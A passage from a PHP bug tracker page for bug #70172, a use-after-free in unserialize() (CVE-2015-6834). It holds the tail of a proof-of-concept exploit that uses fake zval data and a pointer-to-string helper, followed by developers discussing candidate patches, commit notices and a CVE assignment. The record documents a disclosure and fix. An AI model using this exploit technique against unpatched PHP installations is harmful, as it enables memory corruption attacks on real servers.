	$v[$i] = $fakezval.$i;
}

var_dump($data);

function ptr2str($ptr)
{
	$out = '';
	for ($i = 0; $i &lt; 8; $i++) {
		$out .= chr($ptr &amp; 0xff);
		$ptr &gt;&gt;= 8;
	}
	return $out;
}
```
</pre>
</div><div class='comment type_comment' ><a name="1441102864">&nbsp;</a><strong>[2015-09-01 10:21 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>｀｀｀
	if (*rval != NULL) {
		var_push_dtor_no_addref(var_hash, rval);
	}
｀｀｀

so remove the following code can fix this issue

		var_push_dtor_no_addref(&amp;var_hash, &amp;old_rval);
</pre>
</div><div class='comment type_comment' ><a name="1441126967">&nbsp;</a><strong>[2015-09-01 17:02 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Not sure what you mean here, there's no such code as:

var_push_dtor_no_addref(&amp;var_hash, &amp;old_rval);

anywhere I could see.
</pre>
</div><div class='comment type_comment' ><a name="1441127039">&nbsp;</a><strong>[2015-09-01 17:03 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Disregard that, it's in var.c and I was looking in var_unserialize.re
</pre>
</div><div class='comment type_comment' ><a name="1441127252">&nbsp;</a><strong>[2015-09-01 17:07 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Unfortunately, removing this produces a memory leak in previous POC code:

v010+ [Tue Sep  1 10:05:17 2015]  Script:  '/Users/smalyshev/php-5.4/ext/standard/tests/serialize/bug70172.php'
011+ /Users/smalyshev/php-5.4/Zend/zend_vm_execute.h(636) :  Freeing 0x104292600 (32 bytes), script=/Users/smalyshev/php-5.4/ext/standard/tests/serialize/bug70172.php

So it's not a good fix.
</pre>
</div><div class='comment type_svn' ><a name="1441133724">&nbsp;</a><strong>[2015-09-01 18:55 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e8429400d40e3c3aa4b22ba701991d698a2f3b2f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e8429400d40e3c3aa4b22ba701991d698a2f3b2f</a>
Log: Fix <a href='bug.php?id=70172'>bug #70172</a> - Use After Free Vulnerability in unserialize()
</pre>
</div><div class='comment type_log' ><a name="1441133725">&nbsp;</a><strong>[2015-09-01 18:55 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Open</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_svn' ><a name="1441134273">&nbsp;</a><strong>[2015-09-01 19:04 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e8429400d40e3c3aa4b22ba701991d698a2f3b2f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e8429400d40e3c3aa4b22ba701991d698a2f3b2f</a>
Log: Fix <a href='bug.php?id=70172'>bug #70172</a> - Use After Free Vulnerability in unserialize()
</pre>
</div><div class='comment type_svn' ><a name="1441134424">&nbsp;</a><strong>[2015-09-01 19:07 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e8429400d40e3c3aa4b22ba701991d698a2f3b2f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e8429400d40e3c3aa4b22ba701991d698a2f3b2f</a>
Log: Fix <a href='bug.php?id=70172'>bug #70172</a> - Use After Free Vulnerability in unserialize()
</pre>
</div><div class='comment type_svn' ><a name="1441182544">&nbsp;</a><strong>[2015-09-02 08:29 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e8429400d40e3c3aa4b22ba701991d698a2f3b2f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e8429400d40e3c3aa4b22ba701991d698a2f3b2f</a>
Log: Fix <a href='bug.php?id=70172'>bug #70172</a> - Use After Free Vulnerability in unserialize()
</pre>
</div><div class='comment type_svn' ><a name="1441303824">&nbsp;</a><strong>[2015-09-03 18:10 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e8429400d40e3c3aa4b22ba701991d698a2f3b2f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e8429400d40e3c3aa4b22ba701991d698a2f3b2f</a>
Log: Fix <a href='bug.php?id=70172'>bug #70172</a> - Use After Free Vulnerability in unserialize()
</pre>
</div><div class='comment type_comment' ><a name="1441356614">&nbsp;</a><strong>[2015-09-04 08:50 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>this solution can fixes the issue and memory leaks. 

```
		zval_dtor(old_rval);
		*old_rval = *return_value;
		zval_copy_ctor(old_rval);
		var_push_dtor_no_addref(&amp;var_hash, &amp;return_value);
-		var_push_dtor_no_addref(&amp;var_hash, &amp;old_rval);
+		Z_SET_REFCOUNT_P(old_rval, 2);
```
</pre>
</div><div class='comment type_comment' ><a name="1441786174">&nbsp;</a><strong>[2015-09-09 08:09 UTC] rakib &#x64;&#111;&#x74; ri390 &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>ok.iam subscribing.
i want to subscrib for free.
</pre>
</div><div class='comment type_log' ><a name="1441793284">&nbsp;</a><strong>[2015-09-09 10:08 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID:      2015-6834</span>
</div></div></div><div class='comment type_comment' ><a name="1441793284">&nbsp;</a><strong>[2015-09-09 10:08 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<pre class='note'>Shared CVE between bugs #70172, #70365 and #70366.
</pre>
</div><div class='comment type_related' ><a name="1445091244">&nbsp;</a><strong>[2015-10-17 14:14 UTC] bugs &#x61;&#116; tmarques &#x64;&#111;&#x74; com</strong>
<pre class='note'>Related To: <a href='bug.php?id=69693'>Bug #69693</a>
</pre>
</div><div class='comment type_comment' ><a name="1477252073">&nbsp;</a><strong>[2016-10-23 19:47 UTC] <a href="//people.php.net/nikic">nikic@php.net</a></strong>
<pre class='note'>I'd like to fix the remaining issue in the XFAIL test. What do you think about <a href="https://github.com/php/php-src/pull/2174" rel="nofollow">https://github.com/php/php-src/pull/2174</a> (against 7.0)?

We clearly can't support real references (as opposed to object references) for the unserialize() return value, because unserialize() does not return by reference.

The proposed patch just ensures that the unserialize() return value has a stable address using var_tmp_var(). We do this pretty much everywhere we call the internal unserialize API, but for some reason this isn't done in unserialize() itself. Am I missing something here?
</pre>
</div><div class='comment type_related' ><a name="1481629937">&nbsp;</a><strong>[2016-12-13 11:52 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<pre class='note'>Related To: <a href='bug.php?id=72978'>Bug #72978</a>
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
